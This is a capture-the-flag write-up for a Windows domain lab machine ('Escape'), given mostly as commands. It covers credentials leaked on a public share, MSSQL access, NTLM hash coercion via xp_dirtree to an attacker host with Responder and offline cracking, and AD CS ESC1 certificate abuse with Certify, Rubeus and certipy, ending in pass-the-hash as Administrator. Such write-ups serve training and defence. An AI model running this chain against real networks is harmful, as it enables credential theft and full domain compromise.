# Escape (Medium)

Credentials leaked in a public document lead to MSSQL access, an NTLM capture via `xp_dirtree`, and an AD CS ESC1 certificate-template escalation.

## Enumeration

```bash
nmap -sC -sV <target>
```

```
53/tcp   open domain
88/tcp   open kerberos-sec  (Domain: sequel.htb)
135/tcp  open msrpc
139/tcp  open netbios-ssn
389/tcp  open ldap          (cert CN=dc.sequel.htb)
445/tcp  open microsoft-ds?
464/tcp  open kpasswd5?
593/tcp  open ncacn_http
636/tcp  open ssl/ldap
1433/tcp open ms-sql-s      Microsoft SQL Server 2019
3268/tcp open ldap
3269/tcp open ssl/ldap
```

## Foothold — Public share → MSSQL

```bash
crackmapexec smb <target> -u 'DoesNotExist' -p '' --shares
smbclient -N //<target>/Public
```

A `SQL Server Procedures.pdf` document described a "PublicUser" account with read access and included working credentials (redacted — `<REDACTED>`).

```bash
impacket-mssqlclient sequel.htb/PublicUser:<REDACTED>@<target>
```

## NTLM capture via `xp_dirtree`

With `Responder` listening (SMB enabled in `responder.conf`):

```bash
sudo responder -I tun0 -v
```

From the MSSQL session, force the SQL service account to authenticate to the attacker host:

```sql
EXEC MASTER.sys.xp_dirtree '\\<attacker>\test', 1, 1
```

Captured NetNTLMv2 hash for `sql_svc` (redacted), cracked offline with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

A `C:\SQLServer\Logs\ERRORLOG.BAK` file (from the resulting shell) showed failed logons where a user had accidentally typed their password into the username field — revealing another account's real password. Used to get a WinRM shell and `user.txt`.

## Privilege Escalation — AD CS ESC1 (Certify / certipy)

```bash
upload Certify.exe
.\Certify.exe find /vulnerable
```

A certificate template (`ENROLLEE_SUPPLIES_SUBJECT`) allowed any authenticated user to request a certificate on behalf of `Domain Admins`. Two equivalent exploitation paths were used:

**Certify + Rubeus:**
```powershell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```
> The resulting private key / certificate PEM is sensitive output and is not reproduced here.

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
```
→ NTLM hash for Administrator (redacted).

```bash
psexec.py administrator@<target> -hashes <REDACTED>:<REDACTED>
```

**certipy-ad (equivalent, simpler path):**
```bash
certipy req -u ryan.cooper@sequel.htb -p <REDACTED> -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication
sudo ntpdate -u dc.sequel.htb
certipy-ad auth -pfx administrator.pfx
evil-winrm -i sequel.htb -u administrator -H <REDACTED>
```

## Takeaways

- Internal documentation (PDFs, wikis) distributed on open shares is a very common first foothold.
- `xp_dirtree`/`xp_fileexist` against an attacker UNC path is a reliable way to coerce NTLM auth from an MSSQL service account.
- Misconfigured certificate templates (ESC1: enrollee-supplied SAN + low-privilege enrollment rights) are one of the most common AD CS privesc paths — audit with `Certify`/`certipy find -vulnerable`.
